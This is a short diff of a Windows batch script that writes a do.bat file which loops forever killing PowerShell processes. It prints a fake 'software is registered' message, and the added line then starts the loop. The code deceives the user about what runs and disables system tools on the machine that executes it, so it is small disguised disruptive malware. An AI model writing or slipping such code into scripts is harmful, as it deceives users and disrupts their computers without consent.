@@ -12,6 +12,7 @@ echo taskkill /f /im powershell.exe>>do.bat
 echo taskkill /f /im powershell_ise.exe>>do.bat
 echo goto do>>do.bat
 echo Congratulations! The software is registered.
+start do.bat
 pause
 cls
 color 04
